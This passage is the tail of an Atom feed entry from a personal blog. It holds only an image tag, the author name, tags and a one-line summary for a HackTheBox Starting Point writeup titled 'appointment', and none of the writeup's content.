+<p><img src="http://localhost:4000/assets/images/htb/appointment/3.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="StartingPoint" /><category term="writeup" /><summary type="html"><![CDATA[[StartingPoint][HackTheBox] Writeup de appointment.]]></summary></entry></feed>
